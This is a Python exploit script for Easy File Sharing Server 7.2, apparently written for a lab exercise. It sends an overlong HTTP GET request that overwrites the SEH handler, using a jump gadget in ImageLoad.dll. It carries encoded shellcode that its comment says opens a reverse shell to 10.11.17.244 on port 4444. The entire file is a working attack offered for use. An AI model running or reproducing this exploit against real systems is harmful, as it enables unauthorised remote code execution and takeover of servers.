#!/usr/bin/python
import socket
import sys

host= "10.11.17.53"
port= 80

#[*]Target acquired ----> 10.11.17.53:80
#
#[*]Buffer Sent[*]
#
#This shell has been brought to you by Gr1zz1y

#Easy File Sharing Server 7.2 // Tested on Vista Ultimate x86
#No bad characters discovered
#710 byte rev shell to 10.11.17.244 on port 4444/ encoded with x86/alpha_mixed
shellcode=("\x89\xe2\xdb\xcd\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x69\x78\x6c\x42\x33\x30\x45\x50\x45\x50\x65\x30\x4d"
"\x59\x6d\x35\x64\x71\x6b\x70\x75\x34\x6c\x4b\x30\x50\x54\x70"
"\x6e\x6b\x71\x42\x74\x4c\x6e\x6b\x50\x52\x45\x44\x4c\x4b\x61"
"\x62\x45\x78\x36\x6f\x6e\x57\x51\x5a\x56\x46\x55\x61\x4b\x4f"
"\x4c\x6c\x37\x4c\x63\x51\x53\x4c\x73\x32\x46\x4c\x61\x30\x4b"
"\x71\x6a\x6f\x64\x4d\x63\x31\x69\x57\x58\x62\x69\x62\x76\x32"
"\x31\x47\x6c\x4b\x33\x62\x52\x30\x6c\x4b\x51\x5a\x55\x6c\x4c"
"\x4b\x52\x6c\x56\x71\x52\x58\x79\x73\x57\x38\x45\x51\x48\x51"
"\x66\x31\x4c\x4b\x62\x79\x65\x70\x66\x61\x6b\x63\x6e\x6b\x63"
"\x79\x74\x58\x6a\x43\x65\x6a\x62\x69\x6c\x4b\x74\x74\x6e\x6b"
"\x33\x31\x78\x56\x30\x31\x39\x6f\x4e\x4c\x39\x51\x4a\x6f\x76"
"\x6d\x33\x31\x48\x47\x65\x68\x79\x70\x52\x55\x69\x66\x45\x53"
"\x33\x4d\x59\x68\x55\x6b\x53\x4d\x61\x34\x63\x45\x59\x74\x76"
"\x38\x6e\x6b\x30\x58\x65\x74\x35\x51\x39\x43\x61\x76\x4e\x6b"
"\x76\x6c\x42\x6b\x4c\x4b\x50\x58\x37\x6c\x56\x61\x6e\x33\x4c"
"\x4b\x36\x64\x4c\x4b\x35\x51\x7a\x70\x4e\x69\x51\x54\x66\x44"
"\x77\x54\x73\x6b\x61\x4b\x45\x31\x43\x69\x63\x6a\x42\x71\x49"
"\x6f\x79\x70\x71\x4f\x43\x6f\x32\x7a\x4c\x4b\x76\x72\x38\x6b"
"\x4e\x6d\x73\x6d\x50\x68\x54\x73\x30\x32\x47\x70\x67\x70\x33"
"\x58\x72\x57\x44\x33\x37\x42\x63\x6f\x53\x64\x73\x58\x30\x4c"
"\x43\x47\x65\x76\x67\x77\x6b\x4f\x6e\x35\x4e\x58\x7a\x30\x55"
"\x51\x75\x50\x55\x50\x44\x69\x58\x44\x71\x44\x62\x70\x50\x68"
"\x36\x49\x4b\x30\x72\x4b\x57\x70\x6b\x4f\x7a\x75\x70\x50\x56"
"\x30\x36\x30\x76\x30\x47\x30\x50\x50\x43\x70\x30\x50\x71\x78"
"\x4b\x5a\x56\x6f\x39\x4f\x59\x70\x39\x6f\x78\x55\x6f\x67\x61"
"\x7a\x67\x75\x55\x38\x75\x5a\x46\x6b\x52\x31\x4b\x44\x72\x48"
"\x36\x62\x57\x70\x62\x31\x71\x4c\x6d\x59\x5a\x46\x73\x5a\x72"
"\x30\x32\x76\x76\x37\x73\x58\x4d\x49\x4e\x45\x53\x44\x33\x51"
"\x6b\x4f\x69\x45\x4d\x55\x59\x50\x73\x44\x46\x6c\x79\x6f\x30"
"\x4e\x76\x68\x52\x55\x68\x6c\x71\x78\x6a\x50\x58\x35\x6d\x72"
"\x42\x76\x59\x6f\x79\x45\x61\x78\x53\x53\x32\x4d\x70\x64\x67"
"\x70\x4f\x79\x69\x73\x31\x47\x72\x77\x51\x47\x30\x31\x6c\x36"
"\x61\x7a\x74\x52\x42\x79\x70\x56\x6a\x42\x39\x6d\x51\x76\x49"
"\x57\x57\x34\x66\x44\x45\x6c\x56\x61\x47\x71\x4e\x6d\x70\x44"
"\x51\x34\x54\x50\x49\x56\x65\x50\x61\x54\x43\x64\x42\x70\x72"
"\x76\x61\x46\x50\x56\x51\x56\x46\x36\x50\x4e\x51\x46\x73\x66"
"\x56\x33\x32\x76\x45\x38\x31\x69\x58\x4c\x67\x4f\x4e\x66\x39"
"\x6f\x59\x45\x4d\x59\x6b\x50\x72\x6e\x70\x56\x30\x46\x6b\x4f"
"\x76\x50\x51\x78\x46\x68\x4c\x47\x67\x6d\x73\x50\x39\x6f\x69"
"\x45\x6d\x6b\x5a\x50\x4f\x45\x59\x32\x33\x66\x53\x58\x4c\x66"
"\x6e\x75\x6f\x4d\x6d\x4d\x39\x6f\x79\x45\x67\x4c\x33\x36\x71"
"\x6c\x37\x7a\x4b\x30\x49\x6b\x39\x70\x43\x45\x76\x65\x6f\x4b"
"\x72\x67\x62\x33\x43\x42\x50\x6f\x42\x4a\x75\x50\x72\x73\x69"
"\x6f\x6e\x35\x41\x41")
#JMP JMP RETN in Imageload.dll 0x100197b5
seh="\xB5\x97\x01\x10"
#JMP 10 bytes over SEH address above
island="\xEB\x0A\x90\x90"
buffer= "A" * 4061 + island + seh + "\x90" * 4 + shellcode

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print "[*]Target acquired ----> " + host + ":" + str(port) + "\r\n"
s.send("GET " + buffer + " HTTP/1.0\r\n\r\n")
print "[*]Buffer sent[*]\r\n"
s.close() 
print "This shell has been brought to you by Gr1zz1y\r\n"
